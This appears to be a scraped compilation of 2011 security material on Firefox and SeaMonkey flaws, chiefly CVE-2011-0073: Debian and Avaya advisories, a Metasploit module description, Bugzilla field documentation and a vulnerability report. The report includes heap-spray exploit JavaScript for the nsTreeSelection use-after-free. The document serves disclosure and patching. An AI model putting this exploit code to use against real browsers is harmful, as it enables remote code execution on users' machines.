   Paul Stone discovered that Java applets could steal information
   from the autocompletion history.

CVE-2011-0071

   Soroush Dalili discovered a directory traversal vulnerability in
   handling resource URIs.

For the oldstable distribution (lenny), this problem will be fixed soon
with updated packages of the xulrunner source package.

For the stable distribution (squeeze), this problem has been fixed in
version 3.5.16-7.

For the unstable distribution (sid), this problem has been fixed in
version 3.5.19-1.

We recommend that you upgrade your iceweasel packages.

'Description' => %q{
This module exploits a code execution vulnerability in Mozilla Firefox
3.6.x <= 3.6.16 and 3.5.x <= 3.5.17 found in nsTreeSelection.
By overwriting a subfunction of invalidateSelection it is possible to free the
nsTreeRange object that the function currently operates on.
Any further operations on the freed object can result in remote code execution.
Utilizing the call setup the function provides it's possible to bypass DEP
without the need for a ROP. Sadly this exploit is still either dependent
on Java or bound by ASLR because Firefox doesn't employ any ASLR-free
modules anymore.

seamonkey security update (RHSA-2011-0473)

Original Release Date: May 2, 2011

Last Revised: May 2, 2011

Number: ASA-2011-135

Risk Level: Low

Advisory Version: 1.0

Advisory Status: Final

---

## 1. Overview:

SeaMonkey is an open source web browser, email and newsgroup client, IRC
chat client, and HTML editor.

Several flaws were found in the processing of malformed web content. A web
page containing malicious content could possibly lead to arbitrary code
execution with the privileges of the user running SeaMonkey.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2011-0080](https://www.redhat.com/security/data/cve/CVE-2011-0080.html) to this issue.

An arbitrary memory write flaw was found in the way SeaMonkey handled
out-of-memory conditions. If all memory was consumed when a user visited a
malicious web page, it could possibly lead to arbitrary code execution
with the privileges of the user running SeaMonkey. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0078](https://www.redhat.com/security/data/cve/CVE-2011-0078.html) to this issue.

An integer overflow flaw was found in the way SeaMonkey handled the HTML
frameset tag. A web page with a frameset tag containing large values for
the "rows" and "cols" attributes could trigger this flaw, possibly leading
to arbitrary code execution with the privileges of the user running
SeaMonkey. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0077](https://www.redhat.com/security/data/cve/CVE-2011-0077.html) to this issue.

A flaw was found in the way SeaMonkey handled the HTML iframe tag. A web
page with an iframe tag containing a specially-crafted source address could
trigger this flaw, possibly leading to arbitrary code execution with the
privileges of the user running SeaMonkey. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0075](https://www.redhat.com/security/data/cve/CVE-2011-0075.html) to this issue.

A flaw was found in the way SeaMonkey displayed multiple marquee elements.
A malformed HTML document could cause SeaMonkey to execute arbitrary code
with the privileges of the user running SeaMonkey. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0074](https://www.redhat.com/security/data/cve/CVE-2011-0074.html) to this issue.

A flaw was found in the way SeaMonkey handled the nsTreeSelection element.
Malformed content could cause SeaMonkey to execute arbitrary code with the
privileges of the user running SeaMonkey. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0073](https://www.redhat.com/security/data/cve/CVE-2011-0073.html) to this issue.

A use-after-free flaw was found in the way SeaMonkey appended frame and
iframe elements to a DOM tree when the NoScript add-on was enabled.
Malicious HTML content could cause SeaMonkey to execute arbitrary code with
the privileges of the user running SeaMonkey. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0072](https://www.redhat.com/security/data/cve/CVE-2011-0072.html) to this issue.

More information about these vulnerabilities can be found in the security advisory issued by Red Hat:

* <https://rhn.redhat.com/errata/RHSA-2011-0473.html>

## 2. Avaya System Products using a modified version of RHEL4 with affected components/packages installed:

| Product: | Affected Version(s): | Risk Level: | Actions: |
| --- | --- | --- | --- |
| Avaya Message Networking | 3.1 | Low | Upgrade to MN 5.2 or later. |

**Recommended Actions for System Products:**
Avaya strongly recommends that customers follow
networking and security best practices by implementing
firewalls, ACLs, physical security or other appropriate
access restrictions. Though Avaya believes such
restrictions should always be in place, risk to Avaya
products and the surrounding network from this potential
vulnerability may be mitigated by ensuring these
practices are implemented until such time as an Avaya provided
product update or the recommended Avaya action is applied.
Further restrictions as deemed necessary based on the
customer's security policies may be required during this
interim period, but customers should not modify the System Product
operating system or application unless the change is approved by Avaya.
Making changes that are not approved may void the Avaya product service contract.Mitigating Factors:

When determining risk, Avaya takes into account many factors as
outlined by Avaya's
[Security Vulnerability Classification Policy](https://support.avaya.com/css/P8/documents/100066674).
The following table describes factors that mitigate the risk of specific
vulnerabilities for affected Avaya products:

| Vulnerability | Mitigating Factors |
| --- | --- |
| CVE-2011-0072 CVE-2011-0073 CVE-2011-0074 CVE-2011-0075 CVE-2011-0077 CVE-2011-0078 CVE-2011-0080 | These are a low as no critical system applications or processes would be affected and would require non-standard user interaction. |

## 3. Avaya Software-Only Products:

Avaya software-only products operate on general-purpose operating systems.
Occasionally vulnerabilities may be discovered in the underlying operating system or
applications that come with the operating system. These vulnerabilities often do not
impact the software-only product directly but may threaten the integrity of the
underlying platform.

In the case of this advisory Avaya software-only products are not affected by the
vulnerability directly but the underlying Linux platform may be. Customers should
determine on which Linux operating system the product was installed and then follow
that vendor's guidance.

| Product: | Actions: |
| --- | --- |
| Avaya Aura® Application Enablement Services 4.x/5.x | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the AES application. |
| CVLAN | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the CVLAN application. |
| Avaya Integrated Management Suite (IMS) | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the IMS application. |
| Avaya Aura® Presence Services | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the PS application. |
| Avaya Aura® System Manager 1.0 | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the SMGR application. |
| Voice Portal | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the Voice Portal application. |

**Recommended Actions for Software-Only Products:**
In the event that the affected package is installed, Avaya recommends that customers follow recommended actions supplied by Red Hat regarding their Enterprise Linux.

## 4. Additional Information:

Additional information may also be available via the Avaya support
[website](http://support.avaya.com) and through your Avaya
account representative. Please contact your Avaya product support
representative, or dial 1-800-242-2121, with any questions.

You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product.

Core :: XUL

For bugs in the [XUL
language](http://www.mozilla.org/xpfe/xptoolkit/xulintro.html). (XUL is an XML-based language which specifies Mozilla's user interface.)

If you're not actually writing XUL code, this is probably not the right place for your bug.

Examples of appropriate bugs: Duplicate window ID causes infinite loop; or Scrollbars disappear after loading XUL document

ZDI-CAN-1084: Mozilla Firefox nsTreeRange Dangling Pointer Remote Code Execution Vulnerability
-- CVSS ----------------------------------------------------------------
9, (AV:N/AC:L/Au:N/C:P/I:P/A:C)
-- ABSTRACT ------------------------------------------------------------
TippingPoint has identified a vulnerability affecting the following
products:
Mozilla Firefox
-- VULNERABILITY DETAILS -----------------------------------------------
This vulnerability allows remote attackers to execute arbitrary code on
vulnerable installations of Mozilla Firefox. User interaction is
required to exploit this vulnerability in that the target must visit a
malicious page or open a malicious file.
The specific flaw exists within the way Firefox handles user defined
functions of a nsTreeSelection element. When executing the function
invalidateSelection it is possible to free the nsTreeSelection object
that the function operates on. Any further operations on the freed
object can result in remote code execution.
Version(s) tested: Firefox 3.6.13
Platform(s) tested: Windows XP SP3
---------------------
Vulnerability details
---------------------
View of XUL <tree> element exposes "selection" attribute. This in turn
allows user to setup custom tree box object. One of |nsTreeSelection|
methods is invalidateSelection(). From
layout/xul/base/src/tree/src/nsTreeSelection.cpp:
nsTreeSelection::InvalidateSelection()
{
if (mFirstRange)
mFirstRange->Invalidate();
return NS\_OK;
}
|mFirstRange| is defined as pointer to |nsTreeRange| struct.
struct nsTreeRange
{
...
void Invalidate() {
if (mSelection->mTree)
mSelection->mTree->InvalidateRange(mMin, mMax);
if (mNext)
mNext->Invalidate();
}
...
}
If execution of our custom made method invalidateRange() causes
destruction of all ranges withing selection (including |nsTreeRange|
instance which code is being executed at the moment), |this| in the
context of |Invalidate()| will be referring to already freed memory. In
other words: value of |mNext| is under attackers' control.
sel.tree = {
invalidateRange: function(s,e) {
sel.tree = null;
sel.clearSelection();
var container = new Array();
var addr = unescape("%u0a0a%u0a0a");
var shellcode = unescape("%u9090%u9090"); // +
var big = addr;
while (big.length < 0x100000)
big += big;
var len = big.length - shellcode.length - 1;
for (i = 0; i < 150; ++i)
container.push(big.substring(0, len) + shellcode);
var block = addr;
while (block.length < 8)
block += block;
for (var i = 0; i < 1024\*8; ++i)
container.push(block + addr);
}
}
This will remove the tree and replace the object with 0x0a0a0a0a. Its
not 100% reliable, but it is a working exploit up to the DEP evasion.

The PoC got eaten by TippingPoint's outgoing mail server (it thought it was a virus), so I've requested it in another form.

I'm confused, both of those bugs were fixed in 1.9.2 and back-ported to 1.9.1 -- something else is keeping the trunk safe. I mean beyond the lack of web XUL support, because I don't crash even when I enable remote XUL for testing with a current trunk nightly.

But, as you noticed, even with that taken into account.

[Bug 516237](/show_bug.cgi?id=516237 "RESOLVED FIXED - nsTreeSelection::SetTree doesn't addref the tree") wasn't completely back-ported to 1.9.1 (and presumably 1.9.2, but I didn't check), because Thunderbird depended on it. See [bug 516237 comment 12](/show_bug.cgi?id=516237#c12 "RESOLVED FIXED - nsTreeSelection::SetTree doesn't addref the tree") and subsequent comments and patches.

I was wondering if there is something to fix here, and if you're doing that.
And if so, should this be assigned to you? If not, assign to me.
This is an sg:crit bug we should fix asap.

The "3.6.15" we're releasing today does not fix this bug, the release containing this bug fix has been renamed to "3.6.16" and the bugzilla flags will be updated to reflect that soon. Today's release is a re-release of 3.6.14 plus a fix for a bug that prevented many Java applets from starting up.

firefox security update (RHSA-2011-0471)

Original Release Date: June 27, 2011

Last Revised: February 5, 2013

Number: ASA-2011-194

Risk Level: Low

Advisory Version: 3.0

Advisory Status: Final

---

## 1. Overview:

Mozilla Firefox is an open source web browser. XULRunner provides the XUL
Runtime environment for Mozilla Firefox.

Several flaws were found in the processing of malformed web content. A web
page containing malicious content could possibly lead to arbitrary code
execution with the privileges of the user running Firefox.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the names
[CVE-2011-0080](https://www.redhat.com/security/data/cve/CVE-2011-0080.html) and
[CVE-2011-0081](https://www.redhat.com/security/data/cve/CVE-2011-0081.html) to these issues.

An arbitrary memory write flaw was found in the way Firefox handled
out-of-memory conditions. If all memory was consumed when a user visited a
malicious web page, it could possibly lead to arbitrary code execution
with the privileges of the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0078](https://www.redhat.com/security/data/cve/CVE-2011-0078.html) to this issue.

An integer overflow flaw was found in the way Firefox handled the HTML
frameset tag. A web page with a frameset tag containing large values for
the "rows" and "cols" attributes could trigger this flaw, possibly leading
to arbitrary code execution with the privileges of the user running
Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0077](https://www.redhat.com/security/data/cve/CVE-2011-0077.html) to this issue.

A flaw was found in the way Firefox handled the HTML iframe tag. A web page
with an iframe tag containing a specially-crafted source address could
trigger this flaw, possibly leading to arbitrary code execution with the
privileges of the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0075](https://www.redhat.com/security/data/cve/CVE-2011-0075.html) to this issue.

A flaw was found in the way Firefox displayed multiple marquee elements. A
malformed HTML document could cause Firefox to execute arbitrary code with
the privileges of the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0074](https://www.redhat.com/security/data/cve/CVE-2011-0074.html) to this issue.

A flaw was found in the way Firefox handled the nsTreeSelection element.
Malformed content could cause Firefox to execute arbitrary code with the
privileges of the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0073](https://www.redhat.com/security/data/cve/CVE-2011-0073.html) to this issue.

A use-after-free flaw was found in the way Firefox appended frame and
iframe elements to a DOM tree when the NoScript add-on was enabled.
Malicious HTML content could cause Firefox to execute arbitrary code with
the privileges of the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0072](https://www.redhat.com/security/data/cve/CVE-2011-0072.html) to this issue.

A directory traversal flaw was found in the Firefox resource:// protocol
handler. Malicious content could cause Firefox to access arbitrary files
accessible to the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0071](https://www.redhat.com/security/data/cve/CVE-2011-0071.html) to this issue.

A double free flaw was found in the way Firefox handled
"application/http-index-format" documents. A malformed HTTP response could
cause Firefox to execute arbitrary code with the privileges of the user
running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0070](https://www.redhat.com/security/data/cve/CVE-2011-0070.html) to this issue.

A flaw was found in the way Firefox handled certain JavaScript cross-domain
requests. If malicious content generated a large number of cross-domain
JavaScript requests, it could cause Firefox to execute arbitrary code with
the privileges of the user running Firefox. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0069](https://www.redhat.com/security/data/cve/CVE-2011-0069.html) to this issue.

A flaw was found in the way Firefox displayed the autocomplete pop-up.
Malicious content could use this flaw to steal form history information.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-0067](https://www.redhat.com/security/data/cve/CVE-2011-0067.html) to this issue.

Two use-after-free flaws were found in the Firefox mObserverList and
mChannel objects. Malicious content could use these flaws to execute
arbitrary code with the privileges of the user running Firefox.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the names
[CVE-2011-0066](https://www.redhat.com/security/data/cve/CVE-2011-0066.html) and
[CVE-2011-0065](https://www.redhat.com/security/data/cve/CVE-2011-0065.html) to these issues.

A flaw was found in the Firefox XSLT generate-id() function. This function
returned the memory address of an object in memory, which could possibly be
used by attackers to bypass address randomization protections.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name
[CVE-2011-1202](https://www.redhat.com/security/data/cve/CVE-2011-1202.html) to this issue.

More information about these vulnerabilities can be found in the security advisory issued by Red Hat:

## 2. Avaya System Products using a modified version of RHEL with affected components/packages installed: | Product: | Affected Version(s): | Risk Level: | Actions: | | --- | --- | --- | --- | Avaya Communication Server 1000: * CS1000E * CS1000M * CS1000E/CS1000M Signaling Server | All | None | See mitigating factors below. | Avaya IQ | 5.x | None | See mitigating factors below. || Avaya Message Networking | 3.1, 5.2 thru 5.2.3 | Low | Upgrade to 5.2.4 or later. | | Avaya Messaging Storage Server | 4.0.x, 5.2 thru 5.2.9 | Low | Upgrade to 5.2.10 or later. | | Avaya Aura® Presence Services | 6.0, 6.1, 6.1.1 | Low | Upgrade to 6.1.2 or later. | | Avaya Aura® Session Manager | 1.1, 5.2.x, 6.0.x, 6.1.x | Low | Upgrade to 6.2 or later. | | Avaya Aura® System Manager | 5.2.x, 6.0.x, 6.1.x, 6.2.x | Low | Upgrade to 6.3 or later. |

**Recommended Actions for System Products:**
Avaya strongly recommends that customers follow
networking and security best practices by implementing
firewalls, ACLs, physical security or other appropriate
access restrictions. Though Avaya believes such
restrictions should always be in place, risk to Avaya
products and the surrounding network from this potential
vulnerability may be mitigated by ensuring these
practices are implemented until such time as an Avaya provided
product update or the recommended Avaya action is applied.
Further restrictions as deemed necessary based on the
customer's security policies may be required during this
interim period, but customers should not modify the System Product
operating system or application unless the change is approved by Avaya.
Making changes that are not approved may void the Avaya product service contract.

### Mitigating Factors:

When determining risk, Avaya takes into account many factors as
outlined by Avaya's
[Security Vulnerability Classification Policy](https://support.avaya.com/css/P8/documents/100066674).
The following table describes factors that mitigate the risk of specific
vulnerabilities for affected Avaya products:

| Vulnerability | Mitigating Factors |

CVE-2011-0071

   Soroush Dalili discovered a directory traversal vulnerability in
   handling resource URIs.

As indicated in the Lenny (oldstable) release notes, security support for
the Icedove packages in the oldstable needed to be stopped before the end
of the regular Lenny security maintenance life cycle.
You are strongly encouraged to upgrade to stable or switch to a different
mail client.

For the stable distribution (squeeze), this problem has been fixed in
version 3.0.11-1+squeeze2.

For the unstable distribution (sid), this problem will be fixed soon.

We recommend that you upgrade your icedove packages.
